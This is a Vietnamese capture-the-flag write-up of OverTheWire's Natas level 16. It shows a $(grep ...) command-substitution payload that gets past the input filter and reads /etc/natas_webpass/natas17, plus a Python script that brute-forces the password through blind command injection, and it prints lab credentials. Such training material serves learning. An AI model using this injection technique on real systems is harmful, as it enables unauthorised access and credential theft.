LV16
Truy cập vào trang web, ta nhận được thông điệp:
<img width="1920" height="502" alt="image" src="https://github.com/user-attachments/assets/e76a0c2f-161f-4174-b26b-aecd2bbb6616" />
Click vào chọn view src code ta thấy:
<img width="1379" height="911" alt="image" src="https://github.com/user-attachments/assets/627548e0-3c2e-4d07-8a5f-294fb2f60f3d" />
trông có vẻ giống như phần lớn các challenge trước, nhưng lần này câu lệnh grep đã được chỉnh sửa đôi chút `"grep -i \"$key\" dictionary.txt"`
lần này key đã được đặt trong dấu "" và còn có hàm filter các ký tự đặc biệt để ta không nhập được payload
Vậy lần này ta sẽ dùng format $(command) để chạy lệnh bên trong "" trước rồi mới đến lệnh bên ngoài, nên ta thử nhập $(grep ^a /etc/natas_webpass/natas17)pro
<img width="752" height="832" alt="image" src="https://github.com/user-attachments/assets/3bf976b8-1ed9-4ae3-a422-aeadbbb924cd" />
vì chuỗi tìm không có trong file chứa password nên lệnh grep trả về chuỗi rỗng và grep bên ngoài tìm những chuỗi "pro"
Thử brute-force bằng intruder, ta thấy:
<img width="1862" height="904" alt="image" src="https://github.com/user-attachments/assets/c1fadcc3-87ee-4b5b-adf7-7805bd12f559" />
Vậy ta thử brute force attack đến trang web bằng mã lệnh python:
```
import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

charset = string.ascii_letters + string.digits

password = ""

for i in range(1, 33):
    for char in charset:
        payload = f"$(grep ^{password+char} /etc/natas_webpass/natas17)chicken"
        response = requests.get(url, auth=auth, params={"needle": payload})
        if int(len(response.text))!=1153:
            password += char
            print(f"[+] Tìm được ký tự thứ {i}: {char} → {password}")
            break

print(f"[✅] Password đầy đủ của natas17: {password}")
```
<img width="800" height="269" alt="image" src="https://github.com/user-attachments/assets/84330a5f-4285-4393-b0e1-005cbcf885e0" />
```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```
